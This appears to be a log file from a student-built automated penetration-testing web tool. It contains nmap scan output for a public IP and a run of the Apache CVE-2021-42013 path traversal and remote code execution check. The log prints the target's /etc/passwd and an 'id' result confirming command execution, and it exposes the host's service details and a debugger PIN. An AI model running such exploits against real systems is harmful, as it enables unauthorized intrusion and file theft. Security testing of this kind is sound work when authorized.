+SF:dows%r(GetRequest,2B3,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/login
+SF:\?next=%2F\r\nx-content-type-options:\x20nosniff\r\nreferrer-policy:\x2
+SF:0strict-origin-when-cross-origin\r\npermissions-policy:\x20camera=\(\),
+SF:\x20display-capture=\(\),\x20fullscreen=\(self\),\x20geolocation=\(\),\
+SF:x20microphone=\(\),\x20web-share=\(\)\r\ncross-origin-opener-policy:\x2
+SF:0same-origin\r\ncontent-security-policy:\x20script-src\x20'report-sampl
+SF:e'\x20'self';\x20worker-src\x20'report-sample'\x20'self'\x20blob:;\x20s
+SF:tyle-src\x20'report-sample'\x20'self'\x20'unsafe-inline'\r\nkbn-name:\x
+SF:20kibana\.backmie\.online\r\nkbn-license-sig:\x2022b228dc8aa2ad9755bd9d
+SF:66952f383363427f645c33db951e88c86d5f5fe891\r\ncache-control:\x20private
+SF:,\x20no-cache,\x20no-store,\x20must-revalidate\r\ncontent-length:\x200\
+SF:r\nDate:\x20Sun,\x2007\x20Jul\x202024\x2012:11:09\x20GMT\r\nConnection:
+SF:\x20close\r\n\r\n")%r(HTTPOptions,308,"HTTP/1\.1\x20404\x20Not\x20Found
+SF:\r\nX-Content-Type-Options:\x20nosniff\r\nReferrer-Policy:\x20strict-or
+SF:igin-when-cross-origin\r\nPermissions-Policy:\x20camera=\(\),\x20displa
+SF:y-capture=\(\),\x20fullscreen=\(self\),\x20geolocation=\(\),\x20microph
+SF:one=\(\),\x20web-share=\(\)\r\nCross-Origin-Opener-Policy:\x20same-orig
+SF:in\r\nContent-Security-Policy:\x20script-src\x20'report-sample'\x20'sel
+SF:f';\x20worker-src\x20'report-sample'\x20'self'\x20blob:;\x20style-src\x
+SF:20'report-sample'\x20'self'\x20'unsafe-inline'\r\nkbn-name:\x20kibana\.
+SF:backmie\.online\r\nkbn-license-sig:\x2022b228dc8aa2ad9755bd9d66952f3833
+SF:63427f645c33db951e88c86d5f5fe891\r\ncontent-type:\x20application/json;\
+SF:x20charset=utf-8\r\ncache-control:\x20private,\x20no-cache,\x20no-store
+SF:,\x20must-revalidate\r\ncontent-length:\x2060\r\nDate:\x20Sun,\x2007\x2
+SF:0Jul\x202024\x2012:11:09\x20GMT\r\nConnection:\x20close\r\n\r\n{\"statu
+SF:sCode\":404,\"error\":\"Not\x20Found\",\"message\":\"Not\x20Found\"}")%
+SF:r(RTSPRequest,308,"HTTP/1\.1\x20404\x20Not\x20Found\r\nX-Content-Type-O
+SF:ptions:\x20nosniff\r\nReferrer-Policy:\x20strict-origin-when-cross-orig
+SF:in\r\nPermissions-Policy:\x20camera=\(\),\x20display-capture=\(\),\x20f
+SF:ullscreen=\(self\),\x20geolocation=\(\),\x20microphone=\(\),\x20web-sha
+SF:re=\(\)\r\nCross-Origin-Opener-Policy:\x20same-origin\r\nContent-Securi
+SF:ty-Policy:\x20script-src\x20'report-sample'\x20'self';\x20worker-src\x2
+SF:0'report-sample'\x20'self'\x20blob:;\x20style-src\x20'report-sample'\x2
+SF:0'self'\x20'unsafe-inline'\r\nkbn-name:\x20kibana\.backmie\.online\r\nk
+SF:bn-license-sig:\x2022b228dc8aa2ad9755bd9d66952f383363427f645c33db951e88
+SF:c86d5f5fe891\r\ncontent-type:\x20application/json;\x20charset=utf-8\r\n
+SF:cache-control:\x20private,\x20no-cache,\x20no-store,\x20must-revalidate
+SF:\r\ncontent-length:\x2060\r\nDate:\x20Sun,\x2007\x20Jul\x202024\x2012:1
+SF:1:09\x20GMT\r\nConnection:\x20close\r\n\r\n{\"statusCode\":404,\"error\
+SF:":\"Not\x20Found\",\"message\":\"Not\x20Found\"}");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port9200-TCP:V=7.94%T=SSL%I=7%D=7/7%Time=668A85DC%P=i686-pc-windows-win
+SF:dows%r(GetRequest,29C,"HTTP/1\.0\x20401\x20Unauthorized\r\nWWW-Authenti
+SF:cate:\x20Basic\x20realm=\"security\"\x20charset=\"UTF-8\"\r\nWWW-Authen
+SF:ticate:\x20Bearer\x20realm=\"security\"\r\nWWW-Authenticate:\x20ApiKey\
+SF:r\ncontent-type:\x20application/json\r\ncontent-length:\x20459\r\n\r\n{
+SF:\"error\":{\"root_cause\":\[{\"type\":\"security_exception\",\"reason\"
+SF::\"missing\x20authentication\x20credentials\x20for\x20REST\x20request\x
+SF:20\[/\]\",\"header\":{\"WWW-Authenticate\":\[\"Basic\x20realm=\\\"secur
+SF:ity\\\"\x20charset=\\\"UTF-8\\\"\",\"Bearer\x20realm=\\\"security\\\"\"
+SF:,\"ApiKey\"\]}}\],\"type\":\"security_exception\",\"reason\":\"missing\
+SF:x20authentication\x20credentials\x20for\x20REST\x20request\x20\[/\]\",\
+SF:"header\":{\"WWW-Authenticate\":\[\"Basic\x20realm=\\\"security\\\"\x20
+SF:charset=\\\"UTF-8\\\"\",\"Bearer\x20realm=\\\"security\\\"\",\"ApiKey\"
+SF:\]}},\"status\":401}")%r(HTTPOptions,89,"HTTP/1\.0\x20200\x20OK\r\nAllo
+SF:w:\x20GET,DELETE,HEAD\r\nX-elastic-product:\x20Elasticsearch\r\ncontent
+SF:-type:\x20text/plain;\x20charset=UTF-8\r\ncontent-length:\x200\r\n\r\n"
+SF:)%r(RTSPRequest,150,"RTSP/1\.0\x20400\x20Bad\x20Request\r\nX-elastic-pr
+SF:oduct:\x20Elasticsearch\r\ncontent-type:\x20application/json\r\ncontent
+SF:-length:\x20221\r\n\r\n{\"error\":{\"root_cause\":\[{\"type\":\"illegal
+SF:_argument_exception\",\"reason\":\"Unexpected\x20http\x20protocol\x20ve
+SF:rsion:\x20RTSP/1\.0\"}\],\"type\":\"illegal_argument_exception\",\"reas
+SF:on\":\"Unexpected\x20http\x20protocol\x20version:\x20RTSP/1\.0\"},\"sta
+SF:tus\":400}")%r(FourOhFourRequest,2E2,"HTTP/1\.0\x20401\x20Unauthorized\
+SF:r\nWWW-Authenticate:\x20Basic\x20realm=\"security\"\x20charset=\"UTF-8\
+SF:"\r\nWWW-Authenticate:\x20Bearer\x20realm=\"security\"\r\nWWW-Authentic
+SF:ate:\x20ApiKey\r\ncontent-type:\x20application/json\r\ncontent-length:\
+SF:x20529\r\n\r\n{\"error\":{\"root_cause\":\[{\"type\":\"security_excepti
+SF:on\",\"reason\":\"missing\x20authentication\x20credentials\x20for\x20RE
+SF:ST\x20request\x20\[/nice%20ports%2C/Tri%6Eity\.txt%2ebak\]\",\"header\"
+SF::{\"WWW-Authenticate\":\[\"Basic\x20realm=\\\"security\\\"\x20charset=\
+SF:\\"UTF-8\\\"\",\"Bearer\x20realm=\\\"security\\\"\",\"ApiKey\"\]}}\],\"
+SF:type\":\"security_exception\",\"reason\":\"missing\x20authentication\x2
+SF:0credentials\x20for\x20REST\x20request\x20\[/nice%20ports%2C/Tri%6Eity\
+SF:.txt%2ebak\]\",\"header\":{\"WWW-Authenticate\":\[\"Basic\x20realm=\\\"
+SF:security\\\"\x20charset=\\\"UTF-8\\\"\",\"Bearer\x20realm=\\\"security\
+SF:\\"\",\"ApiKey\"\]}},\"status\":401}");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port9600-TCP:V=7.94%I=7%D=7/7%Time=668A85CC%P=i686-pc-windows-windows%r
+SF:(GenericLines,42A,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Length
+SF::\x20989\r\n\r\nPuma\x20caught\x20this\x20error:\x20Invalid\x20HTTP\x20
+SF:format,\x20parsing\x20fails\.\x20Are\x20you\x20trying\x20to\x20open\x20
+SF:an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x20Puma\?\x20\(Puma::Http
+SF:ParserError\)\norg/jruby/puma/Http11\.java:200:in\x20`execute'\n/usr/sh
+SF:are/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/pum
+SF:a/client\.rb:268:in\x20`try_to_finish'\n/usr/share/logstash/vendor/bund
+SF:le/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/puma/server\.rb:298:in\x20`
+SF:reactor_wakeup'\n/usr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/p
+SF:uma-6\.4\.2-java/lib/puma/server\.rb:248:in\x20`block\x20in\x20run'\n/u
+SF:sr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/li
+SF:b/puma/reactor\.rb:119:in\x20`wakeup!'\n/usr/share/logstash/vendor/bund
+SF:le/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/puma/reactor\.rb:76:in\x20`
+SF:block\x20in\x20select_loop'\norg/nio4r/Selector\.java:218:in\x20`select
+SF:'\n/usr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-ja
+SF:va/lib/puma/")%r(GetRequest,1F9,"HTTP/1\.0\x20200\x20OK\r\nContent-Type
+SF::\x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nContent-
+SF:Length:\x20400\r\n\r\n{\"host\":\"751247e67e9c\",\"version\":\"8\.13\.4
+SF:\",\"http_address\":\"0\.0\.0\.0:9600\",\"id\":\"76e96a99-e805-4b63-97a
+SF:a-b1561d4654a2\",\"name\":\"logstash\",\"ephemeral_id\":\"3a890be7-70bc
+SF:-4622-84b9-4c22678de0ef\",\"status\":\"green\",\"snapshot\":false,\"pip
+SF:eline\":{\"workers\":4,\"batch_size\":125,\"batch_delay\":50},\"build_d
+SF:ate\":\"2024-05-06T13:04:36\+00:00\",\"build_sha\":\"80e67bc73d1dede7d6
+SF:83c72df122fc6be5d47d1b\",\"build_snapshot\":false}")%r(HTTPOptions,B9,"
+SF:HTTP/1\.0\x20404\x20Not\x20Found\r\nX-Cascade:\x20pass\r\nContent-Type:
+SF:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nContent-L
+SF:ength:\x2057\r\n\r\n{\"path\":\"/\",\"status\":404,\"error\":{\"message
+SF:\":\"Not\x20Found\"}}")%r(RTSPRequest,337,"HTTP/1\.0\x20400\x20Bad\x20R
+SF:equest\r\nContent-Length:\x20746\r\n\r\nPuma\x20caught\x20this\x20error
+SF::\x20Invalid\x20HTTP\x20format,\x20parsing\x20fails\.\x20Are\x20you\x20
+SF:trying\x20to\x20open\x20an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x
+SF:20Puma\?\x20\(Puma::HttpParserError\)\norg/jruby/puma/Http11\.java:200:
+SF:in\x20`execute'\n/usr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/p
+SF:uma-6\.4\.2-java/lib/puma/client\.rb:268:in\x20`try_to_finish'\n/usr/sh
+SF:are/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/pum
+SF:a/client\.rb:287:in\x20`eagerly_finish'\n/usr/share/logstash/vendor/bun
+SF:dle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/puma/server\.rb:449:in\x20
+SF:`process_client'\n/usr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/
+SF:puma-6\.4\.2-java/lib/puma/server\.rb:245:in\x20`block\x20in\x20run'\n/
+SF:usr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/l
+SF:ib/puma/thread_pool\.rb:155:in\x20`block\x20in\x20spawn_thread'HTTP/1\.
+SF:1\x20400\x20Bad\x20Request\r\n\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 426.27 seconds
+
+2024-07-07 19:14:31,344 INFO Found Apache ports: ['80', '889', '3790']
+2024-07-07 19:14:31,345 INFO Checking vulnerabilities on http://152.42.212.132:80
+2024-07-07 19:14:31,359 DEBUG Starting new HTTP connection (1): 152.42.212.132:80
+2024-07-07 19:14:31,469 DEBUG http://152.42.212.132:80 "HEAD / HTTP/11" 200 0
+2024-07-07 19:14:31,474 DEBUG Starting new HTTP connection (1): 152.42.212.132:80
+2024-07-07 19:14:31,537 DEBUG http://152.42.212.132:80 "HEAD / HTTP/11" 200 0
+2024-07-07 19:14:31,538 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-07 19:14:31,540 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 19:14:31,676 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 19:14:31,849 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 19:14:32,099 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 19:14:54,472 INFO Checking vulnerabilities on http://152.42.212.132:3790
+2024-07-07 19:14:54,473 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 19:14:54,557 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 19:14:54,561 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 19:14:54,627 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 19:14:54,632 INFO Vulnerability findings: http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+
+2024-07-07 19:14:54,707 INFO Header added successfully.
+2024-07-07 19:14:54,729 INFO Cover page created successfully.
+2024-07-07 19:14:54,956 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 19:14:54,956 INFO Process completed in 499.6681776046753 seconds.
+2024-07-07 19:14:54,963 INFO 127.0.0.1 - - [07/Jul/2024 19:14:54] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 19:14:54,989 INFO 127.0.0.1 - - [07/Jul/2024 19:14:54] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 19:26:14,902 INFO 127.0.0.1 - - [07/Jul/2024 19:26:14] "GET /static/output/Penetration_Test_Report_Apache.docx HTTP/1.1" 200 -
+2024-07-07 20:32:07,832 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-07 20:32:08,200 INFO  * Restarting with stat
+2024-07-07 20:32:10,543 WARNING  * Debugger is active!
+2024-07-07 20:32:10,548 INFO  * Debugger PIN: 860-226-893
+2024-07-07 20:32:18,097 INFO  * Detected change in 'D:\\tugas_akhir_final\\main.py', reloading
+2024-07-07 20:32:18,234 INFO  * Restarting with stat
+2024-07-07 20:32:20,295 WARNING  * Debugger is active!
+2024-07-07 20:32:20,307 INFO  * Debugger PIN: 860-226-893
+2024-07-07 20:32:21,501 INFO 127.0.0.1 - - [07/Jul/2024 20:32:21] "GET / HTTP/1.1" 200 -
+2024-07-07 20:32:21,615 INFO 127.0.0.1 - - [07/Jul/2024 20:32:21] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 20:32:23,474 INFO 127.0.0.1 - - [07/Jul/2024 20:32:23] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 20:32:23,540 INFO 127.0.0.1 - - [07/Jul/2024 20:32:23] "GET /pfsense_form HTTP/1.1" 200 -
+2024-07-07 20:32:23,560 INFO 127.0.0.1 - - [07/Jul/2024 20:32:23] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 20:32:25,990 INFO 127.0.0.1 - - [07/Jul/2024 20:32:25] "GET / HTTP/1.1" 200 -
+2024-07-07 20:32:26,015 INFO 127.0.0.1 - - [07/Jul/2024 20:32:26] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 20:32:29,321 INFO 127.0.0.1 - - [07/Jul/2024 20:32:29] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 20:32:29,344 INFO 127.0.0.1 - - [07/Jul/2024 20:32:29] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 20:32:29,379 INFO 127.0.0.1 - - [07/Jul/2024 20:32:29] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 20:32:32,443 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 20:42:49,938 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 20:36 SE Asia Standard Time
+Nmap scan report for 152.42.212.132
+Host is up (0.037s latency).
+Not shown: 65521 closed tcp ports (reset)
+PORT      STATE    SERVICE         VERSION
+22/tcp    open     ssh             OpenSSH 9.6p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 82:95:15:88:17:2c:b4:c9:b0:b7:bd:3f:03:ff:6f:c5 (ECDSA)
+|_  256 a9:b8:d6:8e:29:ca:55:fe:4c:9c:f1:ed:23:33:23:47 (ED25519)
+80/tcp    open     http?
+139/tcp   filtered netbios-ssn
+445/tcp   filtered microsoft-ds
+889/tcp   open     http            Apache httpd 2.4.50 ((Unix))
+|_http-server-header: Apache/2.4.50 (Unix)
+3790/tcp  open     http            nginx
+5044/tcp  open     lxi-evntsvc?
+5601/tcp  open     ssl/esmagent?
+| tls-alpn: 
+|_  http/1.1
+|     HTTP/1.1 302 Found
+|     location: /login?next=%2F
+|     x-content-type-options: nosniff
+|     referrer-policy: strict-origin-when-cross-origin
+|     permissions-policy: camera=(), display-capture=(), fullscreen=(self), geolocation=(), microphone=(), web-share=()
+|     cross-origin-opener-policy: same-origin
+|     content-security-policy: script-src 'report-sample' 'self'; worker-src 'report-sample' 'self' blob:; style-src 'report-sample' 'self' 'unsafe-inline'
+|     kbn-name: kibana.backmie.online
+|     kbn-license-sig: 22b228dc8aa2ad9755bd9d66952f383363427f645c33db951e88c86d5f5fe891
+|     cache-control: private, no-cache, no-store, must-revalidate
+|     content-length: 0
+|     Date: Sun, 07 Jul 2024 13:38:40 GMT
+|     Connection: close
+|   HTTPOptions: 
+|     HTTP/1.1 404 Not Found
+|     X-Content-Type-Options: nosniff
+|     Referrer-Policy: strict-origin-when-cross-origin
+|     Permissions-Policy: camera=(), display-capture=(), fullscreen=(self), geolocation=(), microphone=(), web-share=()
+|     Cross-Origin-Opener-Policy: same-origin
+|     Content-Security-Policy: script-src 'report-sample' 'self'; worker-src 'report-sample' 'self' blob:; style-src 'report-sample' 'self' 'unsafe-inline'
+|     kbn-name: kibana.backmie.online
+|     kbn-license-sig: 22b228dc8aa2ad9755bd9d66952f383363427f645c33db951e88c86d5f5fe891
+|     content-type: application/json; charset=utf-8
+|     cache-control: private, no-cache, no-store, must-revalidate
+|     content-length: 60
+|     Date: Sun, 07 Jul 2024 13:38:40 GMT
+|     Connection: close
+|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
+|   RTSPRequest: 
+|     HTTP/1.1 404 Not Found
+|     X-Content-Type-Options: nosniff
+|     Referrer-Policy: strict-origin-when-cross-origin
+|     Permissions-Policy: camera=(), display-capture=(), fullscreen=(self), geolocation=(), microphone=(), web-share=()
+|     Cross-Origin-Opener-Policy: same-origin
+|     Content-Security-Policy: script-src 'report-sample' 'self'; worker-src 'report-sample' 'self' blob:; style-src 'report-sample' 'self' 'unsafe-inline'
+|     kbn-name: kibana.backmie.online
+|     kbn-license-sig: 22b228dc8aa2ad9755bd9d66952f383363427f645c33db951e88c86d5f5fe891
+|     content-type: application/json; charset=utf-8
+|     cache-control: private, no-cache, no-store, must-revalidate
+|     content-length: 60
+|     Date: Sun, 07 Jul 2024 13:38:41 GMT
+|     Connection: close
+|_    {"statusCode":404,"error":"Not Found","message":"Not Found"}
+|     HTTP/1.0 401 Unauthorized
+|     WWW-Authenticate: Basic realm="security" charset="UTF-8"
+|     WWW-Authenticate: Bearer realm="security"
+|     WWW-Authenticate: ApiKey
+|     content-type: application/json
+|     content-length: 529
+|     {"error":{"root_cause":[{"type":"security_exception","reason":"missing authentication credentials for REST request [/nice%20ports%2C/Tri%6Eity.txt%2ebak]","header":{"WWW-Authenticate":["Basic realm="security" charset="UTF-8"","Bearer realm="security"","ApiKey"]}}],"type":"security_exception","reason":"missing authentication credentials for REST request [/nice%20ports%2C/Tri%6Eity.txt%2ebak]","header":{"WWW-Authenticate":["Basic realm="security" charset="UTF-8"","Bearer realm="security"","ApiKey"]}},"status":401}
+|   GetRequest: 
+|     HTTP/1.0 401 Unauthorized
+|     WWW-Authenticate: Basic realm="security" charset="UTF-8"
+|     WWW-Authenticate: Bearer realm="security"
+|     WWW-Authenticate: ApiKey
+|     content-type: application/json
+|     content-length: 459
+|     {"error":{"root_cause":[{"type":"security_exception","reason":"missing authentication credentials for REST request [/]","header":{"WWW-Authenticate":["Basic realm="security" charset="UTF-8"","Bearer realm="security"","ApiKey"]}}],"type":"security_exception","reason":"missing authentication credentials for REST request [/]","header":{"WWW-Authenticate":["Basic realm="security" charset="UTF-8"","Bearer realm="security"","ApiKey"]}},"status":401}
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Allow: GET,DELETE,HEAD
+|     X-elastic-product: Elasticsearch
+|     content-type: text/plain; charset=UTF-8
+|     content-length: 0
+|   RTSPRequest: 
+|     RTSP/1.0 400 Bad Request
+|     X-elastic-product: Elasticsearch
+|     content-type: application/json
+|     content-length: 221
+|_    {"error":{"root_cause":[{"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"}],"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"},"status":400}
+|     HTTP/1.0 400 Bad Request
+|     Content-Length: 989
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/client.rb:268:in `try_to_finish'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/server.rb:298:in `reactor_wakeup'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/server.rb:248:in `block in run'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/reactor.rb:119:in `wakeup!'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/reactor.rb:76:in `block in select_loop'
+|     org/nio4r/Selector.java:218:in `select'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     Content-Length: 400
+|     {"host":"751247e67e9c","version":"8.13.4","http_address":"0.0.0.0:9600","id":"76e96a99-e805-4b63-97aa-b1561d4654a2","name":"logstash","ephemeral_id":"3a890be7-70bc-4622-84b9-4c22678de0ef","status":"green","snapshot":false,"pipeline":{"workers":4,"batch_size":125,"batch_delay":50},"build_date":"2024-05-06T13:04:36+00:00","build_sha":"80e67bc73d1dede7d683c72df122fc6be5d47d1b","build_snapshot":false}
+|   HTTPOptions: 
+|     HTTP/1.0 404 Not Found
+|     X-Cascade: pass
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     Content-Length: 57
+|     {"path":"/","status":404,"error":{"message":"Not Found"}}
+|   RTSPRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Length: 746
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/client.rb:268:in `try_to_finish'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/client.rb:287:in `eagerly_finish'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/server.rb:449:in `process_client'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/server.rb:245:in `block in run'
+|_    /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/thread_pool.rb:155:in `block in spawn_thread'HTTP/1.1 400 Bad Request
+4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port53-TCP:V=7.94%I=7%D=7/7%Time=668A9A54%P=i686-pc-windows-windows%r(D
+SF:NSVersionBindReqTCP,E,"\0\x0c\0\x06\x81\x84\0\0\0\0\0\0\0\0");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port5601-TCP:V=7.94%T=SSL%I=7%D=7/7%Time=668A9A60%P=i686-pc-windows-win
+SF:dows%r(GetRequest,2B3,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/login
+SF:\?next=%2F\r\nx-content-type-options:\x20nosniff\r\nreferrer-policy:\x2
+SF:0strict-origin-when-cross-origin\r\npermissions-policy:\x20camera=\(\),
+SF:\x20display-capture=\(\),\x20fullscreen=\(self\),\x20geolocation=\(\),\
+SF:x20microphone=\(\),\x20web-share=\(\)\r\ncross-origin-opener-policy:\x2
+SF:0same-origin\r\ncontent-security-policy:\x20script-src\x20'report-sampl
+SF:e'\x20'self';\x20worker-src\x20'report-sample'\x20'self'\x20blob:;\x20s
+SF:tyle-src\x20'report-sample'\x20'self'\x20'unsafe-inline'\r\nkbn-name:\x
+SF:20kibana\.backmie\.online\r\nkbn-license-sig:\x2022b228dc8aa2ad9755bd9d
+SF:66952f383363427f645c33db951e88c86d5f5fe891\r\ncache-control:\x20private
+SF:,\x20no-cache,\x20no-store,\x20must-revalidate\r\ncontent-length:\x200\
+SF:r\nDate:\x20Sun,\x2007\x20Jul\x202024\x2013:38:40\x20GMT\r\nConnection:
+SF:\x20close\r\n\r\n")%r(HTTPOptions,308,"HTTP/1\.1\x20404\x20Not\x20Found
+SF:\r\nX-Content-Type-Options:\x20nosniff\r\nReferrer-Policy:\x20strict-or
+SF:igin-when-cross-origin\r\nPermissions-Policy:\x20camera=\(\),\x20displa
+SF:y-capture=\(\),\x20fullscreen=\(self\),\x20geolocation=\(\),\x20microph
+SF:one=\(\),\x20web-share=\(\)\r\nCross-Origin-Opener-Policy:\x20same-orig
+SF:in\r\nContent-Security-Policy:\x20script-src\x20'report-sample'\x20'sel
+SF:f';\x20worker-src\x20'report-sample'\x20'self'\x20blob:;\x20style-src\x
+SF:20'report-sample'\x20'self'\x20'unsafe-inline'\r\nkbn-name:\x20kibana\.
+SF:backmie\.online\r\nkbn-license-sig:\x2022b228dc8aa2ad9755bd9d66952f3833
+SF:63427f645c33db951e88c86d5f5fe891\r\ncontent-type:\x20application/json;\
+SF:x20charset=utf-8\r\ncache-control:\x20private,\x20no-cache,\x20no-store
+SF:,\x20must-revalidate\r\ncontent-length:\x2060\r\nDate:\x20Sun,\x2007\x2
+SF:0Jul\x202024\x2013:38:40\x20GMT\r\nConnection:\x20close\r\n\r\n{\"statu
+SF:sCode\":404,\"error\":\"Not\x20Found\",\"message\":\"Not\x20Found\"}")%
+SF:r(RTSPRequest,308,"HTTP/1\.1\x20404\x20Not\x20Found\r\nX-Content-Type-O
+SF:ptions:\x20nosniff\r\nReferrer-Policy:\x20strict-origin-when-cross-orig
+SF:in\r\nPermissions-Policy:\x20camera=\(\),\x20display-capture=\(\),\x20f
+SF:ullscreen=\(self\),\x20geolocation=\(\),\x20microphone=\(\),\x20web-sha
+SF:re=\(\)\r\nCross-Origin-Opener-Policy:\x20same-origin\r\nContent-Securi
+SF:ty-Policy:\x20script-src\x20'report-sample'\x20'self';\x20worker-src\x2
+SF:0'report-sample'\x20'self'\x20blob:;\x20style-src\x20'report-sample'\x2
+SF:0'self'\x20'unsafe-inline'\r\nkbn-name:\x20kibana\.backmie\.online\r\nk
+SF:bn-license-sig:\x2022b228dc8aa2ad9755bd9d66952f383363427f645c33db951e88
+SF:c86d5f5fe891\r\ncontent-type:\x20application/json;\x20charset=utf-8\r\n
+SF:cache-control:\x20private,\x20no-cache,\x20no-store,\x20must-revalidate
